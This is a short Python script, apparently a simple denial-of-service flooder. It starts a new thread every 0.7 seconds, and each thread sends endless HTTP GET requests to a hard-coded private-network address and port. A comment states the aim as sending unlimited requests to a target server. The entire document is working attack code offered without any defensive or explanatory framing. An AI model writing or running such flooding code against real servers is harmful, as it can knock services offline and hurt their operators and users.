import requests, time
from _thread import *

def process(target):
    #  Send unlimited requests to target server
    while True:
        try:
            requests.get(target)
        except requests.exceptions.HTTPError as e:
            print(e)
            exit()
        except requests.exceptions.RequestException as e:
            print(e)
            exit()

while True:
    start_new_thread(process, ('http://192.168.50.129:9999/',))
    time.sleep(0.7)
    